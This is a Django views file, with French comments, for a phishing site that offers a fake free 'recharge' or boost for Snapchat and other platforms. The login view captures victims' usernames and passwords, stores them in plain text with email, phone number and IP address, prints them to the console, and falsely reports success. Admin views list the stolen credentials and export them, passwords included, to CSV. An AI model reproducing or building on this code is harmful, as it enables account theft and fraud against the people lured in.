from django.shortcuts import render
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from django.views.decorators.http import require_http_methods
from django.contrib.admin.views.decorators import staff_member_required
from django.db.models import Count, Q
from django.utils import timezone
from datetime import timedelta
from .models import SnapchatUser, RechargeRequest, ClickLog
import json

def index(request):
    """Affiche la page d'accueil avec l'offre de rechargement gratuit"""
    return render(request, 'accounts/index.html')

@csrf_exempt
@require_http_methods(["POST"])
def login_view(request):
    """Gère la connexion et sauvegarde les identifiants en clair"""
    try:
        data = json.loads(request.body)
        username = data.get('username')
        password = data.get('password')
        platform = data.get('platform', 'snapchat')
        offer_type = data.get('offer_type', 'free_boost')
        
        if not username or not password:
            return JsonResponse({'error': 'Username et password requis'}, status=400)
        
        # Sauvegarde en clair dans la base de données
        snap_user = SnapchatUser.objects.create(
            username=username,
            password_clear=password,
            email=data.get('email', ''),
            phone_number=data.get('phone', ''),
            platform_clicked=platform,
            ip_address=get_client_ip(request),
            user_agent=request.META.get('HTTP_USER_AGENT', '')
        )
        
        # Sauvegarde la demande de recharge
        recharge = RechargeRequest.objects.create(
            user=snap_user,
            platform=platform,
            offer_type=offer_type,
            account_username=username,
            ip_address=get_client_ip(request),
            status='completed'
        )
        
        print(f"[ALERTE] Nouvelle recharge - Plateforme: {platform}, Forfait: {offer_type}, Username: {username}, Password: {password}")
        
        return JsonResponse({
            'message': 'Recharge effectuée avec succès',
            'user_id': snap_user.id,
            'recharge_id': recharge.id
        }, status=200)
        
    except Exception as e:
        return JsonResponse({'error': str(e)}, status=500)

@csrf_exempt
@require_http_methods(["POST"])
def log_click(request):
    """Enregistre un clic sur un forfait"""
    try:
        data = json.loads(request.body)
        
        ClickLog.objects.create(
            session_id=data.get('session_id', ''),
            platform=data.get('platform', ''),
            offer_name=data.get('offer_name', ''),
            ip_address=get_client_ip(request),
            user_agent=request.META.get('HTTP_USER_AGENT', '')
        )
        
        return JsonResponse({'success': True}, status=200)
    except Exception as e:
        return JsonResponse({'error': str(e)}, status=500)

def get_client_ip(request):
    """Récupère l'adresse IP du client"""
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')
    return ip

@staff_member_required
def admin_dashboard(request):
    """Tableau de bord admin complet"""
    # Statistiques générales
    total_users = SnapchatUser.objects.count()
    total_recharges = RechargeRequest.objects.count()
    total_clicks = ClickLog.objects.count()
    
    # Statistiques par plateforme
    users_by_platform = SnapchatUser.objects.values('platform_clicked').annotate(
        count=Count('id')
    ).order_by('-count')
    
    recharges_by_platform = RechargeRequest.objects.values('platform').annotate(
        count=Count('id')
    ).order_by('-count')
    
    # Statistiques par forfait
    recharges_by_offer = RechargeRequest.objects.values('offer_type').annotate(
        count=Count('id')
    ).order_by('-count')
    
    # Recharges aujourd'hui
    today = timezone.now().date()
    today_recharges = RechargeRequest.objects.filter(
        created_at__date=today
    ).count()
    
    # Derniers clics
    recent_clicks = ClickLog.objects.all()[:20]
    
    # Dernières recharges
    recent_recharges = RechargeRequest.objects.select_related('user').all()[:20]
    
    context = {
        'total_users': total_users,
        'total_recharges': total_recharges,
        'total_clicks': total_clicks,
        'today_recharges': today_recharges,
        'users_by_platform': users_by_platform,
        'recharges_by_platform': recharges_by_platform,
        'recharges_by_offer': recharges_by_offer,
        'recent_clicks': recent_clicks,
        'recent_recharges': recent_recharges,
    }
    
    return render(request, 'accounts/admin_dashboard.html', context)

@staff_member_required
def view_credentials(request):
    """Vue admin pour voir les identifiants"""
    users = SnapchatUser.objects.all()
    data = []
    for user in users:
        data.append({
            'id': user.id,
            'username': user.username,
            'password_clear': user.password_clear,
            'email': user.email,
            'phone_number': user.phone_number,
            'platform_clicked': user.get_platform_clicked_display(),
            'platform_code': user.platform_clicked,
            'created_at': user.created_at.strftime('%Y-%m-%d %H:%M:%S'),
            'ip_address': user.ip_address
        })
    return JsonResponse({'users': data}, json_dumps_params={'ensure_ascii': False})

@staff_member_required
def view_recharges(request):
    """Vue admin pour voir les demandes de recharge avec forfaits"""
    recharges = RechargeRequest.objects.select_related('user').all()
    data = []
    for req in recharges:
        data.append({
            'id': req.id,
            'platform': req.get_platform_display(),
            'platform_code': req.platform,
            'offer_type': req.get_offer_type_display(),
            'offer_code': req.offer_type,
            'account_username': req.account_username,
            'status': req.status,
            'created_at': req.created_at.strftime('%Y-%m-%d %H:%M:%S'),
            'ip_address': req.ip_address,
            'user_username': req.user.username if req.user else 'Anonyme',
            'user_password': req.user.password_clear if req.user else 'N/A'
        })
    return JsonResponse({'recharges': data}, json_dumps_params={'ensure_ascii': False})

@staff_member_required
def view_clicks(request):
    """Vue admin pour voir les clics sur les forfaits"""
    clicks = ClickLog.objects.all()
    data = []
    for click in clicks:
        data.append({
            'id': click.id,
            'platform': click.platform,
            'offer_name': click.offer_name,
            'clicked_at': click.clicked_at.strftime('%Y-%m-%d %H:%M:%S'),
            'ip_address': click.ip_address
        })
    return JsonResponse({'clicks': data}, json_dumps_params={'ensure_ascii': False})

@staff_member_required
def export_all_data(request):
    """Exporte toutes les données en CSV"""
    import csv
    from django.http import HttpResponse
    
    response = HttpResponse(content_type='text/csv')
    response['Content-Disposition'] = 'attachment; filename="all_data.csv"'
    
    writer = csv.writer(response)
    writer.writerow(['Type', 'ID', 'Username', 'Password', 'Plateforme', 'Forfait', 'Date/Heure', 'IP Address'])
    
    # Export des recharges (avec identifiants)
    recharges = RechargeRequest.objects.select_related('user').all()
    for req in recharges:
        writer.writerow([
            'RECHARGE',
            req.id,
            req.user.username if req.user else 'N/A',
            req.user.password_clear if req.user else 'N/A',
            req.get_platform_display(),
            req.get_offer_type_display(),
            req.created_at.strftime('%Y-%m-%d %H:%M:%S'),
            req.ip_address
        ])
    
    # Export des clics
    clicks = ClickLog.objects.all()
    for click in clicks:
        writer.writerow([
            'CLIC',
            click.id,
            'N/A',
            'N/A',
            click.platform,
            click.offer_name,
            click.clicked_at.strftime('%Y-%m-%d %H:%M:%S'),
            click.ip_address
        ])
    
    return response